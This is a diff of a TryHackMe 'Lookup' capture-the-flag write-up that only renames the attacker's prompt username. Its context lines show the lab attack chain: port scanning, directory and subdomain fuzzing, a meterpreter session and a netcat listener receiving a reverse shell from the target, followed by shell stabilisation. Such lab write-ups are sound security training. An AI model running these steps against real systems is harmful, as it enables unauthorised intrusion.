@@ -14,7 +14,7 @@ Tags : #easy
 We use [Rustscan](../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Lookup]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Lookup]
 └─$ rustscan -a 10.10.181.47 -- -A 
 .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
 | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
@@ -27,7 +27,7 @@ ________________________________________
  --------------------------------------
 TreadStone was here 🚀
 
-[~] The config file is expected to be at "/home/hax/.rustscan.toml"
+[~] The config file is expected to be at "/home/mdn0x/.rustscan.toml"
 [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
 [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
 Open 10.10.181.47:22
@@ -64,7 +64,7 @@ So we need some credentials, if we insert admin we are told the user exists so t
 Let's try to find some hidden directory with [Gobuster](../../3%20-%20Tags/Hacking%20Tools/Gobuster.md) :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Lookup]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Lookup]
 └─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://lookup.thm 
 
 ===============================================================
@@ -103,7 +103,7 @@ Finished
 We will use [FFuf](../../3%20-%20Tags/Hacking%20Tools/FFuf.md) for [Fuzzing](../../3%20-%20Tags/Hacking%20Concepts/Fuzzing.md) and try to find something else on subdomains :
 
 ```
-┌──(hax㉿HaxonKali)-[~]
+┌──(mdn0x㉿mdn0xonKali)-[~]
 └─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -H 'Host: FUZZ.lookup.thm' -u http://sudo.thm -fs 218 -c
 
         /'___\  /'___\           /'___\       
@@ -201,7 +201,7 @@ Now that we have a meterpreter connection, we can get the [Shell](../../3%20-%20
 - On attacking system `nc -lvnp 4444`  [Netcat](../../3%20-%20Tags/Hacking%20Tools/Netcat.md) :
 
 ```
-┌──(hax㉿HaxonKali)-[~]
+┌──(mdn0x㉿mdn0xonKali)-[~]
 └─$ nc -lvnp 4444
 listening on [any] 4444 ...
 connect to [10.8.162.183] from (UNKNOWN) [10.10.181.47] 60502
@@ -222,7 +222,7 @@ www-data@ip-10-10-181-47:/var/www/files.lookup.thm/public_html$ ^Z
 
 zsh: suspended  nc -lvnp 4444
 
-┌──(hax㉿HaxonKali)-[~]
+┌──(mdn0x㉿mdn0xonKali)-[~]
 └─$ stty raw -echo; fg
 [1]  + continued  nc -lvnp 4444
                                reset
